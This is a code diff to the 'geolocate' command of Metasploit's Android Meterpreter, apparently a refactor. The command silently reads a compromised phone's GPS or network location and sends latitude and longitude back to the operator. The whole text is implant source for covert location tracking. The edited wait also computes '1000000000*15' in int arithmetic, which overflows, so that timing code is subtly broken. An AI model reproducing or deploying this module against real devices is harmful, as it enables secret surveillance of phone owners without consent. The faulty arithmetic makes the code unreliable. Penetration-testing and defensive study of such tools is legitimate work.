@@ -3,6 +3,8 @@ package com.metasploit.meterpreter.android;
 import android.content.Context;
 import android.location.Location;
 import android.location.LocationManager;
+import android.location.LocationListener;
+import android.os.Bundle;
 
 import com.metasploit.meterpreter.AndroidMeterpreter;
 import com.metasploit.meterpreter.Meterpreter;
@@ -16,6 +18,21 @@ public class geolocate implements Command {
             | (TLV_EXTENSIONS + 9011);
     private static final int TLV_TYPE_GEO_LONG = TLVPacket.TLV_META_TYPE_STRING
             | (TLV_EXTENSIONS + 9012);
+
+    // stubbed listener (so we can wait for the gps on the main thread)
+    private class MyLocationListener implements LocationListener {
+        @Override
+        public void onLocationChanged(Location loc) {}
+
+        @Override
+        public void onProviderDisabled(String provider) {}
+
+        @Override
+        public void onProviderEnabled(String provider) {}
+
+        @Override
+        public void onStatusChanged(String provider, int status, Bundle extras) {}
+    }
 
     @Override
     public int execute(Meterpreter meterpreter, TLVPacket request,
@@ -32,14 +49,14 @@ public class geolocate implements Command {
             addLocationToResponse(location, response);
         } else {
             LocationListener listener = new MyLocationListener();
-            mlocManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);
+            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, listener);
 
-            long stop = System.nanoTime() + TimeUnit.SECONDS.toNanos(30);
+            long stop = System.nanoTime() + 1000000000*15; // 15 seconds
             while (System.nanoTime() < stop);
 
-            mlocManager.removeUpdates(listener);
+            locationManager.removeUpdates(listener);
 
-            Location location = locationManager
+            location = locationManager
                 .getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
 
             if (location != null) {
@@ -50,28 +67,14 @@ public class geolocate implements Command {
             }
         }
 
-        private addLocationToResponse(Location location, TLVPacket response) {
-            response.add(TLV_TYPE_GEO_LAT,
-                    Double.toString(location.getLatitude()));
-            response.add(TLV_TYPE_GEO_LONG,
-                    Double.toString(location.getLongitude()));
-        }
-
         return ERROR_SUCCESS;
     }
 
-    // stubbed listener (so we can wait for the gps on the main thread)
-    private class MyLocationListener implements LocationListener {
-        @Override
-        public void onLocationChanged(Location loc) {}
-
-        @Override
-        public void onProviderDisabled(String provider) {}
-
-        @Override
-        public void onProviderEnabled(String provider) {}
-
-        @Override
-        public void onStatusChanged(String provider, int status, Bundle extras) {}
+    private void addLocationToResponse(Location location, TLVPacket response) {
+        response.add(TLV_TYPE_GEO_LAT,
+                Double.toString(location.getLatitude()));
+        response.add(TLV_TYPE_GEO_LONG,
+                Double.toString(location.getLongitude()));
     }
+
 }
